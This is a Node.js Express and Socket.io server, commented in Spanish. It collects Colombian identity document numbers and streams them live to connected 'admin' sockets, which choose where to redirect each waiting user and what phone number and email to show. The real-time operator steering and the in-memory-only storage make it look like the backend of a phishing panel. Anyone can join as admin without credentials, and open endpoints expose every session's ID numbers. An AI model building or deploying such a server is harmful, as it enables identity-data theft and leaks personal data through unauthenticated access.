const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());

// Almacenamiento en memoria VOLÁTIL - sesiones activas solamente
const activeSessions = new Map();
const adminSockets = new Set();

// Limpiar sesiones antiguas cada 30 segundos
setInterval(() => {
  const now = Date.now();
  let cleaned = 0;
  
  activeSessions.forEach((session, sessionId) => {
    // Eliminar sesiones completadas con más de 10 segundos
    if (session.status === 'completed' && session.completedAt && (now - session.completedAt) > 10000) {
      activeSessions.delete(sessionId);
      cleaned++;
    }
    // Eliminar sesiones waiting con más de 30 minutos (por si acaso)
    else if (session.status === 'waiting' && (now - session.timestamp) > 1800000) {
      activeSessions.delete(sessionId);
      cleaned++;
    }
  });
  
  if (cleaned > 0) {
    console.log(`🧹 Limpiadas ${cleaned} sesiones antiguas`);
  }
}, 30000);

app.post('/api/session', (req, res) => {
  const { documentType, documentNumber, sessionId } = req.body;
  
  console.log(`🎯 NUEVA SESIÓN INMEDIATA: ${sessionId} - ${documentNumber}`);
  
  // Crear sesión NUEVA siempre - sin verificar duplicados
  const sessionData = {
    sessionId,
    documentType,
    documentNumber,
    documentTypeText: getDocumentTypeText(documentType),
    timestamp: Date.now(),
    status: 'waiting',
    redirectTo: null,
    phoneNumber: null,
    emailAddress: null,
    completedAt: null
  };
  
  // GUARDAR SESIÓN INMEDIATAMENTE
  activeSessions.set(sessionId, sessionData);
  
  // Obtener SOLO sesiones en espera para enviar
  const waitingSessions = Array.from(activeSessions.values())
    .filter(s => s.status === 'waiting')
    .sort((a, b) => a.timestamp - b.timestamp); // Ordenar por timestamp
  
  console.log(`📊 Total sesiones waiting: ${waitingSessions.length}`);
  
  // EMITIR A TODOS LOS ADMINS CONECTADOS - INMEDIATAMENTE
  if (adminSockets.size > 0) {
    adminSockets.forEach(adminSocket => {
      if (adminSocket.connected) {
        adminSocket.emit('sessions_list', waitingSessions);
        adminSocket.emit('new_session', sessionData);
        console.log(`📤 Enviado a admin: ${adminSocket.id}`);
      }
    });
  }
  
  res.json({ 
    success: true, 
    sessionId,
    message: `Sesión registrada - Notificando a ${adminSockets.size} admins`
  });
});

app.get('/api/session/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  
  if (activeSessions.has(sessionId)) {
    res.json({ success: true, session: activeSessions.get(sessionId) });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

app.post('/api/session/:sessionId/redirect', (req, res) => {
  const { sessionId } = req.params;
  const { redirectTo, phoneNumber, emailAddress } = req.body;
  
  if (activeSessions.has(sessionId)) {
    const session = activeSessions.get(sessionId);
    session.status = 'completed';
    session.redirectTo = redirectTo;
    session.phoneNumber = phoneNumber;
    session.emailAddress = emailAddress;
    session.completedAt = Date.now();
    
    // Notificar a todos los admins INMEDIATAMENTE
    const waitingSessions = Array.from(activeSessions.values())
      .filter(s => s.status === 'waiting');
    
    adminSockets.forEach(adminSocket => {
      if (adminSocket.connected) {
        adminSocket.emit('session_updated', session);
        adminSocket.emit('sessions_list', waitingSessions);
      }
    });
    
    // Redirigir al usuario específico
    io.to(sessionId).emit('redirect', { redirectTo, phoneNumber, emailAddress });
    
    console.log(`🔄 Sesión ${sessionId} COMPLETADA → ${redirectTo}`);
    res.json({ success: true });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

// Endpoint para obtener estado actual
app.get('/api/status', (req, res) => {
  const waitingSessions = Array.from(activeSessions.values())
    .filter(s => s.status === 'waiting');
  
  res.json({
    success: true,
    activeSessions: activeSessions.size,
    waitingSessions: waitingSessions.length,
    connectedAdmins: adminSockets.size,
    sessions: waitingSessions
  });
});

// SOCKET.IO CONNECTION HANDLING
io.on('connection', (socket) => {
  console.log('🔌 NUEVA CONEXIÓN:', socket.id);
  
  // Detectar admins
  socket.on('admin_connect', () => {
    console.log('👨‍💼 ADMIN CONECTADO:', socket.id);
    adminSockets.add(socket);
    
    // Enviar estado actual inmediatamente
    const waitingSessions = Array.from(activeSessions.values())
      .filter(s => s.status === 'waiting');
    
    socket.emit('sessions_list', waitingSessions);
    socket.emit('connection_established', { 
      message: 'Admin conectado',
      sessionCount: waitingSessions.length 
    });
    
    console.log(`📨 Estado enviado a admin ${socket.id}: ${waitingSessions.length} sesiones`);
  });
  
  // Detectar usuarios
  socket.on('user_connect', (sessionId) => {
    socket.join(sessionId);
    console.log('👤 Usuario conectado para sesión:', sessionId);
  });
  
  socket.on('disconnect', (reason) => {
    console.log('❌ Cliente desconectado:', socket.id, 'Razón:', reason);
    
    // Remover de admins si estaba
    if (adminSockets.has(socket)) {
      adminSockets.delete(socket);
      console.log('👨‍💼 Admin removido:', socket.id);
    }
  });
  
  socket.on('error', (error) => {
    console.log('❌ Error en socket:', socket.id, error);
  });
});

function getDocumentTypeText(type) {
  const types = {
    'ci': 'Cédula de Ciudadanía',
    'ce': 'Cédula de Extranjería', 
    'pp': 'Pasaporte'
  };
  return types[type] || 'Documento';
}

// Health check endpoint
app.get('/health', (req, res) => {
  const waitingSessions = Array.from(activeSessions.values())
    .filter(s => s.status === 'waiting');
    
  res.json({
    status: 'OK',
    timestamp: new Date().toISOString(),
    activeSessions: activeSessions.size,
    waitingSessions: waitingSessions.length,
    connectedAdmins: adminSockets.size,
    memoryUsage: process.memoryUsage()
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor backend ejecutándose en puerto ${PORT}`);
  console.log(`📡 WebSockets ULTRA RÁPIDOS activos`);
  console.log(`⏰ Listo para recibir conexiones en tiempo real`);
});
